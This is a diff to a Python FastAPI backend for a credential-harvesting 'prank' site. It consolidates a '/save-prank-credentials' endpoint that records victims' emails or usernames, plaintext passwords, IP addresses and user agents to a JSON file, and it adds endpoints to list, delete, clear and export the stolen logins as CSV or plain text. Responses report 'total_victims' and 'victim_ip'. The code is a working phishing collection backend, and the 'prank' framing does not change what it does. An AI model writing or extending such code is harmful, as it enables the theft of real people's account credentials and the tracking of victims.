@@ -1,4 +1,5 @@
-from fastapi import FastAPI, APIRouter, Request
+from fastapi import FastAPI, APIRouter, Request, HTTPException
+from fastapi.responses import StreamingResponse, PlainTextResponse
 from dotenv import load_dotenv
 from starlette.middleware.cors import CORSMiddleware
 from motor.motor_asyncio import AsyncIOMotorClient
@@ -10,8 +11,8 @@ from typing import List
 import uuid
 from datetime import datetime
 import json
-from fastapi import HTTPException
-
+import csv
+from io import StringIO
 
 ROOT_DIR = Path(__file__).parent
 load_dotenv(ROOT_DIR / '.env')
@@ -23,7 +24,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# MongoDB connection
+# MongoDB connection (kept, though file-based storage is used for credentials)
 mongo_url = os.environ['MONGO_URL']
 client = AsyncIOMotorClient(mongo_url)
 db = client[os.environ['DB_NAME']]
@@ -52,10 +53,44 @@ class PrankCredentials(BaseModel):
     prankedAt: str
     timestamp: int
 
+
+CREDENTIALS_FILE = ROOT_DIR / "pranked_user.json"
+REQUIRED_FIELDS = [
+    "id",
+    "emailOrUsername",
+    "password",
+    "ipAddress",
+    "userAgent",
+    "url",
+    "prankedAt",
+    "timestamp",
+]
+
+
+def _read_credentials() -> List[dict]:
+    if not CREDENTIALS_FILE.exists():
+        return []
+    try:
+        content = CREDENTIALS_FILE.read_text().strip()
+        if not content:
+            return []
+        data = json.loads(content)
+        if isinstance(data, list):
+            return data
+        return []
+    except (json.JSONDecodeError, ValueError):
+        return []
+
+
+def _write_credentials(data: List[dict]):
+    CREDENTIALS_FILE.write_text(json.dumps(data, indent=2))
+
+
 # Add your routes to the router instead of directly to app
 @api_router.get("/")
 async def root():
     return {"message": "Hello World"}
+
 
 @api_router.post("/status", response_model=StatusCheck)
 async def create_status_check(input: StatusCheckCreate):
@@ -64,40 +99,25 @@ async def create_status_check(input: StatusCheckCreate):
     _ = await db.status_checks.insert_one(status_obj.dict())
     return status_obj
 
+
 @api_router.get("/status", response_model=List[StatusCheck])
 async def get_status_checks():
     status_checks = await db.status_checks.find().to_list(1000)
     return [StatusCheck(**status_check) for status_check in status_checks]
 
+
 @api_router.post("/save-prank-credentials")
 async def save_prank_credentials(credentials: PrankCredentials, request: Request):
     try:
-        # Create the pranked_user.json file path
-        credentials_file = ROOT_DIR / "pranked_user.json"
-        
         # Load existing data or create empty list
-        if credentials_file.exists():
-            try:
-                with open(credentials_file, 'r') as f:
-                    content = f.read().strip()
-                    if content:
-                        existing_data = json.loads(content)
-                    else:
-                        existing_data = []
-            except (json.JSONDecodeError, ValueError):
-                # If file exists but has invalid JSON, start fresh
-                existing_data = []
-        else:
-            existing_data = []
-        
+        existing_data = _read_credentials()
+
         # Get client IP address
         client_ip = request.client.host
-        
-        # Check for forwarded IPs (if behind proxy)
         forwarded_for = request.headers.get("X-Forwarded-For")
         if forwarded_for:
             client_ip = forwarded_for.split(",")[0].strip()
-        
+
         # Add new credentials to the list
         new_entry = {
             "id": str(uuid.uuid4()),
@@ -107,28 +127,28 @@ async def save_prank_credentials(credentials: PrankCredentials, request: Request
             "userAgent": credentials.userAgent,
             "url": credentials.url,
             "prankedAt": credentials.prankedAt,
-            "timestamp": credentials.timestamp
+            "timestamp": credentials.timestamp,
         }
-        
+
         existing_data.append(new_entry)
-        
+
         # Save back to file
-        with open(credentials_file, 'w') as f:
-            json.dump(existing_data, f, indent=2)
-        
+        _write_credentials(existing_data)
+
         logger.info(f"🎭 Saved pranked credentials for: {credentials.email}")
-        
+
         return {
-            "success": True, 
+            "success": True,
             "message": "Credentials saved successfully",
             "total_victims": len(existing_data),
-            "victim_identifier": credentials.email,  # Could be email, username, or phone
-            "victim_ip": client_ip
+            "victim_identifier": credentials.email,
+            "victim_ip": client_ip,
         }
-        
+
     except Exception as e:
         logger.error(f"Error saving prank credentials: {str(e)}")
         raise HTTPException(status_code=500, detail=f"Failed to save credentials: {str(e)}")
+
 
 @api_router.get("/pranked-credentials")
 async def list_pranked_credentials():
@@ -136,20 +156,63 @@ async def list_pranked_credentials():
     Returns the saved credentials from pranked_user.json as a list.
     If the file does not exist or is invalid/empty, returns an empty list.
     """
-    credentials_file = ROOT_DIR / "pranked_user.json"
-    if not credentials_file.exists():
-        return []
-    try:
-        with open(credentials_file, 'r') as f:
-            content = f.read().strip()
-            if not content:
-                return []
-            data = json.loads(content)
-            if isinstance(data, list):
-                return data
-            return []
-    except (json.JSONDecodeError, ValueError):
-        return []
+    return _read_credentials()
+
+
+@api_router.delete("/pranked-credentials/{entry_id}")
+async def delete_pranked_credential(entry_id: str):
+    """Delete a single credential entry by id."""
+    data = _read_credentials()
+    before = len(data)
+    data = [d for d in data if str(d.get("id")) != entry_id]
+    if len(data) == before:
+        raise HTTPException(status_code=404, detail="Entry not found")
+    _write_credentials(data)
+    return {"deleted": True, "remaining": len(data)}
+
+
+@api_router.post("/pranked-credentials/clear")
+async def clear_pranked_credentials():
+    """Clear all credential entries."""
+    _write_credentials([])
+    return {"cleared": True}
+
+
+@api_router.get("/pranked-credentials/export")
+async def export_pranked_credentials(format: str = "csv"):
+    """
+    Export credentials as CSV or TXT.
+    - CSV: header + rows with all fields
+    - TXT: one entry per line in a readable format
+    """
+    data = _read_credentials()
+
+    if format.lower() == "csv":
+        output = StringIO()
+        writer = csv.DictWriter(output, fieldnames=REQUIRED_FIELDS)
+        writer.writeheader()
+        for row in data:
+            writer.writerow({k: row.get(k, "") for k in REQUIRED_FIELDS})
+        content = output.getvalue()
+        headers = {
+            "Content-Disposition": f"attachment; filename=pranked_credentials_{int(datetime.utcnow().timestamp())}.csv"
+        }
+        return StreamingResponse(iter([content]), media_type="text/csv", headers=headers)
+
+    # TXT export
+    lines = []
+    for r in data:
+        line = (
+            f"id={r.get('id','')} | user={r.get('emailOrUsername','')} | pass={r.get('password','')} | "
+            f"ip={r.get('ipAddress','')} | ua={r.get('userAgent','')} | url={r.get('url','')} | at={r.get('prankedAt','')} | ts={r.get('timestamp','')}"
+        )
+        lines.append(line)
+    content = "\n".join(lines)
+    headers = {
+        "Content-Disposition": f"attachment; filename=pranked_credentials_{int(datetime.utcnow().timestamp())}.txt"
+    }
+    return PlainTextResponse(content, media_type="text/plain", headers=headers)
+
 
 # Include the router in the main app
 app.include_router(api_router)
